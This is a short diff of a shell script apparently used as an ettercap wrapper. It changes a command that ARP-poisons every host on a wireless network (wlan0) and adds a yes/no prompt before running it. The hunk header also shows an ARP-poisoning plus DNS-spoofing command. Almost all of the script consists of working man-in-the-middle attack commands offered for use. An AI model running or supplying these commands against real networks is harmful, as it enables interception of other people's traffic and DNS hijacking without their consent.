@@ -22,8 +22,11 @@ ettercap -T -q -M arp:remote -P dns_spoof //
 
 "
 
-echo 'here is running: ettercap -T -i wlan0 -M arp // //'
-read -p 'sniff all pc with ettercap using wlan0?'
+echo 'here is running: ettercap -T -i wlan0 -M arp:remote // //'
+read -p 'sniff all pc with ettercap using wlan0?[Y|n]' answer
+if [ "$answer" == 'Y' ]
+then
+	ettercap -T -i wlan0 -M arp:remote // //
+fi
 
-ettercap -T -i wlan0 -M arp // //
 
